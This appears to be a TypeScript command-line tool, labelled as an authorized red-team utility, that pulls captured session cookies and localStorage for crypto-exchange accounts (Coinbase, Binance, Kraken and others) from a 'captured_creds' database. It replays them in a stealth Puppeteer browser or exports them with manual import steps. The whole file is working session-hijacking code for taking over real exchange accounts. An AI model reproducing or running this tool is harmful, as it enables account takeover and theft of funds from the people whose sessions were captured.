/**
 * CEX cookie replay — authorized red-team session restoration tool.
 *
 * Usage:
 *   pnpm cex-cookie-replay --list
 *   pnpm cex-cookie-replay --id <uuid> --format editthiscookie
 *   pnpm cex-cookie-replay --id <uuid> --launch
 *
 * Manual replay: DevTools → Application → Cookies → paste EditThisCookie JSON.
 */
import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import { writeFile } from 'node:fs/promises'
import path from 'node:path'
import type { Pool } from 'pg'

const EXCHANGE_DASHBOARD: Record<string, string> = {
  coinbase: 'https://www.coinbase.com',
  binance: 'https://www.binance.com',
  kraken: 'https://www.kraken.com',
  bybit: 'https://www.bybit.com',
  kucoin: 'https://www.kucoin.com',
  okx: 'https://www.okx.com',
  gemini: 'https://www.gemini.com',
  bitfinex: 'https://www.bitfinex.com',
}

type CapturedCred = {
  id: string
  exchange: string
  username: string
  session_cookies: string | null
  local_storage: string | null
  created_at: string
}

function fail(msg: string): never {
  console.error(`[cex-cookie-replay] ${msg}`)
  process.exit(1)
}

function readArg(flag: string): string | undefined {
  const idx = process.argv.indexOf(flag)
  return idx !== -1 ? process.argv[idx + 1]?.trim() : undefined
}

function hasFlag(flag: string): boolean {
  return process.argv.includes(flag)
}

function normalizeDatabaseConnectionString(raw: string): string {
  return raw.trim()
}

function getPool(): Pool {
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) fail('DATABASE_URL not configured')
  return createDatabaseAnchorPool(normalizeDatabaseConnectionString(url), {
    max: 3,
    connectionTimeoutMillis: 10_000,
  })
}

function dashboardUrl(exchange: string): string {
  return EXCHANGE_DASHBOARD[exchange.toLowerCase()] ?? `https://www.${exchange}.com`
}

function cookieDomain(exchange: string): string {
  const host = new URL(dashboardUrl(exchange)).hostname
  return host.startsWith('www.') ? `.${host.slice(4)}` : `.${host}`
}

/** Parse document.cookie string → EditThisCookie JSON array */
export function cookieStringToEditThisCookie(
  cookieStr: string,
  exchange: string,
): Array<Record<string, unknown>> {
  const domain = cookieDomain(exchange)
  const secureHost = dashboardUrl(exchange).startsWith('https')
  return cookieStr
    .split(';')
    .map((part) => part.trim())
    .filter(Boolean)
    .map((pair) => {
      const eq = pair.indexOf('=')
      const name = eq >= 0 ? pair.slice(0, eq).trim() : pair
      const value = eq >= 0 ? pair.slice(eq + 1).trim() : ''
      return {
        domain,
        hostOnly: false,
        httpOnly: false,
        name,
        path: '/',
        sameSite: 'no_restriction',
        secure: secureHost,
        session: true,
        storeId: '0',
        value,
      }
    })
}

function cookieStringToPuppeteer(cookieStr: string, exchange: string) {
  const domain = cookieDomain(exchange).replace(/^\./, '')
  return cookieStr
    .split(';')
    .map((part) => part.trim())
    .filter(Boolean)
    .map((pair) => {
      const eq = pair.indexOf('=')
      const name = eq >= 0 ? pair.slice(0, eq).trim() : pair
      const value = eq >= 0 ? pair.slice(eq + 1).trim() : ''
      return { name, value, domain, path: '/' }
    })
}

async function listCredsWithCookies(pool: Pool): Promise<CapturedCred[]> {
  const result = await pool.query(
    `SELECT id, exchange, username, session_cookies, local_storage, created_at
     FROM captured_creds
     WHERE session_cookies IS NOT NULL AND TRIM(session_cookies) <> ''
     ORDER BY created_at DESC
     LIMIT 50`,
  )
  return result.rows.map((row) => ({
    id: String(row.id),
    exchange: String(row.exchange),
    username: String(row.username),
    session_cookies: row.session_cookies != null ? String(row.session_cookies) : null,
    local_storage: row.local_storage != null ? String(row.local_storage) : null,
    created_at:
      row.created_at instanceof Date ? row.created_at.toISOString() : String(row.created_at),
  }))
}

async function getCredById(pool: Pool, id: string): Promise<CapturedCred | null> {
  const result = await pool.query(
    `SELECT id, exchange, username, session_cookies, local_storage, created_at
     FROM captured_creds WHERE id = $1::uuid`,
    [id],
  )
  const row = result.rows[0]
  if (!row) return null
  return {
    id: String(row.id),
    exchange: String(row.exchange),
    username: String(row.username),
    session_cookies: row.session_cookies != null ? String(row.session_cookies) : null,
    local_storage: row.local_storage != null ? String(row.local_storage) : null,
    created_at:
      row.created_at instanceof Date ? row.created_at.toISOString() : String(row.created_at),
  }
}

async function launchPuppeteer(cred: CapturedCred): Promise<void> {
  if (!cred.session_cookies) fail('No session cookies on this record')
  try {
    const puppeteerExtra = await import('puppeteer-extra')
    const stealthMod = await import('puppeteer-extra-plugin-stealth')
    const StealthPlugin = stealthMod.default ?? stealthMod
    const puppeteer = puppeteerExtra.default ?? puppeteerExtra
    puppeteer.use(StealthPlugin())

    const browser = await puppeteer.launch({
      headless: false,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    })
    const page = await browser.newPage()
    const url = dashboardUrl(cred.exchange)
    const cookies = cookieStringToPuppeteer(cred.session_cookies, cred.exchange)
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60_000 })
    if (cookies.length) await page.setCookie(...cookies)
    if (cred.local_storage) {
      try {
        const ls = JSON.parse(cred.local_storage) as Record<string, string>
        await page.evaluate((data) => {
          Object.entries(data).forEach(([k, v]) => {
            try { localStorage.setItem(k, v) } catch { /* ignore */ }
          })
        }, ls)
      } catch { /* invalid JSON */ }
    }
    await page.reload({ waitUntil: 'networkidle2', timeout: 90_000 })
    console.info(`[cex-cookie-replay] Browser open — ${url}`)
    console.info('[cex-cookie-replay] Close browser window when done.')
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (msg.includes('puppeteer')) {
      fail('puppeteer-extra not installed — run: pnpm install')
    }
    fail(msg)
  }
}

let pool: Pool | null = null

async function main(): Promise<void> {
  pool = getPool()
  const id = readArg('--id')
  const format = readArg('--format') ?? 'editthiscookie'
  const outFile = readArg('--out')

  if (hasFlag('--list')) {
    const rows = await listCredsWithCookies(pool)
    if (!rows.length) {
      console.info('[cex-cookie-replay] No captured creds with session cookies.')
      return
    }
    for (const row of rows) {
      console.info(
        `${row.id}  ${row.exchange.padEnd(10)}  ${row.username.slice(0, 24).padEnd(24)}  ${row.created_at}`,
      )
    }
    return
  }

  if (!id) {
    fail(
      'Usage:\n' +
        '  pnpm cex-cookie-replay --list\n' +
        '  pnpm cex-cookie-replay --id <uuid> --format editthiscookie|raw|puppeteer\n' +
        '  pnpm cex-cookie-replay --id <uuid> --launch\n' +
        '\nManual: paste EditThisCookie JSON into browser extension, or DevTools → Application → Cookies.',
    )
  }

  const cred = await getCredById(pool, id)
  if (!cred) fail(`Credential not found: ${id}`)
  if (!cred.session_cookies) fail('This record has no session cookies')

  if (hasFlag('--launch')) {
    await launchPuppeteer(cred)
    return
  }

  if (format === 'raw') {
    console.log(cred.session_cookies)
    return
  }

  if (format === 'puppeteer') {
    const cookies = cookieStringToPuppeteer(cred.session_cookies, cred.exchange)
    const output = JSON.stringify(cookies, null, 2)
    if (outFile) {
      await writeFile(path.resolve(outFile), output, 'utf8')
      console.info(`[cex-cookie-replay] Wrote ${outFile}`)
    } else {
      console.log(output)
    }
    return
  }

  const etc = cookieStringToEditThisCookie(cred.session_cookies, cred.exchange)
  const output = JSON.stringify(etc, null, 2)
  if (outFile) {
    await writeFile(path.resolve(outFile), output, 'utf8')
    console.info(`[cex-cookie-replay] Wrote ${outFile}`)
  } else {
    console.log(output)
  }

  console.error('\n--- Manual replay instructions ---')
  console.error(`1. Open ${dashboardUrl(cred.exchange)} in Chrome`)
  console.error('2. Install EditThisCookie extension OR use DevTools → Application → Cookies')
  console.error('3. Import the JSON above (EditThisCookie → Import)')
  console.error('4. Refresh the page — session should restore if cookies are still valid')
  if (cred.local_storage) {
    console.error('5. Optional: DevTools → Console → paste localStorage keys from DB record')
  }
}

main()
  .catch((e) => fail(e instanceof Error ? e.message : String(e)))
  .finally(async () => {
    await pool?.end().catch(() => {})
  })
